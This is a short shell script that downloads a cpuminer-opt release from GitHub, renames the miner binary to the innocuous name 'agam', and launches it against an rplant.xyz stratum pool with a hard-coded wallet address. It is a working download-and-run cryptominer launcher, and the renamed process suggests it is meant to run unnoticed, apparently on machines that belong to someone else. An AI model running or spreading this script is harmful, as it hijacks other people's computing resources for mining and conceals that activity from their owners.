#!/bin/sh
#
# Choose nearest stratum:
#	stratum-ru.rplant.xyz   /Moscow/
#	stratum-eu.rplant.xyz   /London/
#	stratum-asia.rplant.xyz /Singapore/
#       stratum-na.rplant.xyz   /Toronto/
#
#gxx
wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/4.5.18/cpuminer-opt-linux.tar.gz   \
&& tar xf cpuminer-opt-linux.tar.gz  \
&& mv cpuminer-avx2 agam   \
&& ./agam -a lyra2z330 -o stratum+tcps://stratum-eu.rplant.xyz:17046 -u HRDiYsGL7xwjPHfKAHNwxwMxvK6UTX5Ptr.ok -p password=bayar -t2
